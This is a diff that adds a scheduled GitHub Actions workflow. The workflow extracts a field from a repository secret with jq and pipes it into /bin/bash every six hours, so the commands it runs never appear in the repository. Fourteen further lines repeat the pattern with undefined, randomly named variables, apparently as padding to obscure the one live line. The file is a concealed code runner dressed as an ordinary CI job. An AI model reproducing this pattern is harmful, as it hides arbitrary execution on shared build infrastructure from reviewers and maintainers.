@@ -1,0 +1,31 @@
+name: indexplaintive
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: indexplaintive
+        env:
+          c6899: ${{ secrets.c6899 }}
+        run: |
+          echo $c6899 | jq -r .d662 | /bin/bash
+          echo $xbfc05712 | jq -r .e204 | /bin/bash
+          echo $sv01 | jq -r .dr51616 | /bin/bash
+          echo $i24417 | jq -r .x9 | /bin/bash
+          echo $xhu94094 | jq -r .xm1384 | /bin/bash
+          echo $ws38 | jq -r .opy7 | /bin/bash
+          echo $d283 | jq -r .aap460 | /bin/bash
+          echo $ecn7088 | jq -r .r2123 | /bin/bash
+          echo $y96 | jq -r .wff288 | /bin/bash
+          echo $innom949 | jq -r .vqdnm3111 | /bin/bash
+          echo $fhesk9416 | jq -r .w4 | /bin/bash
+          echo $psyd666 | jq -r .nvs331 | /bin/bash
+          echo $iyxhn7600 | jq -r .c94 | /bin/bash
+          echo $juw7983 | jq -r .ynpa8 | /bin/bash
+          echo $xlg195 | jq -r .x18 | /bin/bash
+
